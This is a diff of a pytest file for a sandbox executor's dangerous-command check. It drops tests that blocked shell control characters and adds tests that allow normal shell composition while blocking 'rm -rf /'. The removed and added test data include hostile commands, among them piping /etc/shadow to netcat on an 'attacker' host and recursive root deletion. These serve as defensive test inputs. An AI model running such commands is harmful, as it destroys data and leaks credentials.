@@ -1,7 +1,7 @@
 """Tests for sandbox security hardening (Task A1).
 
 Covers:
-- DangerousPatternCheckStrategy shell control character blocking
+- DangerousPatternCheckStrategy destructive-command blocking
 - redact_sensitive integration in _execute_command
 - set_working_dir path range validation
 """
@@ -9,6 +9,7 @@ Covers:
 from __future__ import annotations
 
 import os
+from types import SimpleNamespace
 from unittest.mock import MagicMock, patch
 
 import pytest
@@ -16,11 +17,11 @@ import pytest
 from src.sandbox.executor import DangerousPatternCheckStrategy, SandboxExecutor
 
 # ---------------------------------------------------------------------------
-# DangerousPatternCheckStrategy: shell control character blocking
+# DangerousPatternCheckStrategy: precise destructive-command blocking
 # ---------------------------------------------------------------------------
 
-class TestDangerousPatternShellChars:
-    """DangerousPatternCheckStrategy must unconditionally block shell control characters."""
+class TestDangerousPatterns:
+    """Normal shell composition is allowed; destructive patterns are not."""
 
     @pytest.fixture
     def strategy(self):
@@ -31,25 +32,56 @@ class TestDangerousPatternShellChars:
         """Minimal settings mock (fields are not needed for DangerousPattern)."""
         return MagicMock()
 
-    @pytest.mark.parametrize("char,cmd", [
-        (";", "echo hello; rm -rf /"),
-        ("&&", "ls && cat /etc/passwd"),
-        ("||", "false || echo pwned"),
-        ("|", "cat /etc/shadow | nc attacker 1234"),
-        ("`", "echo `whoami`"),
-        ("$(", "echo $(id)"),
-        (")", "echo foo)bar"),
-    ])
-    def test_blocks_shell_control_chars(self, strategy, settings, char, cmd):
-        is_safe, reason = strategy.check(cmd, settings)
+    def test_allows_safe_shell_composition(self, strategy, settings):
+        command = (
+            "zsh -c \"cd /workspace && python - <<'PY' > /tmp/result\n"
+            "print('ok')\nPY\ncat /tmp/result | sed -n '1p'\""
+        )
+
+        is_safe, reason = strategy.check(command, settings)
+
+        assert is_safe is True
+        assert reason is None
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "rm -rf /",
+            "zsh -c 'rm -rf /'",
+            "rm -rf /; echo should-not-run",
+            "rm -rf / && echo should-not-run",
+        ],
+    )
+    def test_blocks_destructive_root_removal(self, strategy, settings, command):
+        is_safe, reason = strategy.check(command, settings)
+
         assert is_safe is False
-        assert "shell 控制字符" in reason
-        assert char in reason
+        assert "危险操作模式" in reason
 
     def test_allows_safe_command(self, strategy, settings):
         is_safe, reason = strategy.check("ls -la /tmp", settings)
         assert is_safe is True
         assert reason is None
+
+
+def test_sandbox_keeps_configured_blacklist_and_whitelist_gates() -> None:
+    blocked_by_blacklist = SandboxExecutor(
+        settings=SimpleNamespace(
+            sandbox_use_whitelist=False,
+            command_whitelist=[],
+            command_blacklist=["secret-tool"],
+        )
+    )
+    blocked_by_whitelist = SandboxExecutor(
+        settings=SimpleNamespace(
+            sandbox_use_whitelist=True,
+            command_whitelist=["git"],
+            command_blacklist=[],
+        )
+    )
+
+    assert blocked_by_blacklist.is_command_safe("secret-tool run")[0] is False
+    assert blocked_by_whitelist.is_command_safe("python build.py")[0] is False
 
 
 # ---------------------------------------------------------------------------
